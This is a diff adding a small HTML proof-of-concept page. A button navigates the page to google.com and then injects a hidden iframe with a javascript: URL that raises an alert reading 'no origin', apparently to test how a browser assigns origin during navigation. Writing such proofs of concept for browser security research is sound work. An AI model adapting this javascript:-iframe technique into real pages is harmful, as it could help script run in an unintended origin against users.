@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PoC</title>
+    <script>
+    function triggerIframe() {
+        var iframe = document.createElement('iframe');
+        var w = document.location="http://www.google.com"
+        //location.replace("http://www.google.com");
+        iframe.src = 'javascript:alert("no"+" origin");';
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+    }
+    </script>
+</head>
+<body>
+    <button onclick="triggerIframe()">Trigger</button>
+</body>
+</html>
